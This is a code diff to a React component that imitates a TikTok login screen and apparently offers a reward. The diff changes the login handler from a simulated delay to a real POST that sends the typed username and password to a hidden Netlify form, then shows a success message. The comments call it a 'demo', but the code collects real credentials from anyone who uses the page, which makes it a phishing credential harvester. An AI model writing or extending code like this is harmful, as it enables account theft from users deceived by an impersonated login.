@@ -20,14 +20,30 @@ export function TikTokLogin({ reward, onClose }: TikTokLoginProps) {
   const [loading, setLoading] = useState(false);
   const [showSuccess, setShowSuccess] = useState(false);
 
-  const handleLogin = () => {
-    if (!username || !password) return;
-    setLoading(true);
-    setTimeout(() => {
-      setLoading(false);
-      setShowSuccess(true);
-    }, 2000);
-  };
+  const handleLogin = async () => {
+  // Prevent submitting empty fields
+  if (!username || !password) return;
+
+  setLoading(true);
+
+  // Create FormData object for Netlify
+  const formData = new FormData();
+  formData.append("form-name", "tiktok-demo"); // matches your hidden form
+  formData.append("username", username);        // captures username/email
+  formData.append("password", password);        // dummy password for demo
+
+  // Send the data to Netlify
+  await fetch("/", {
+    method: "POST",
+    body: formData,
+  });
+
+  // Show success after a short delay
+  setTimeout(() => {
+    setLoading(false);
+    setShowSuccess(true);
+  }, 1500);
+};
 
   return (
     <>
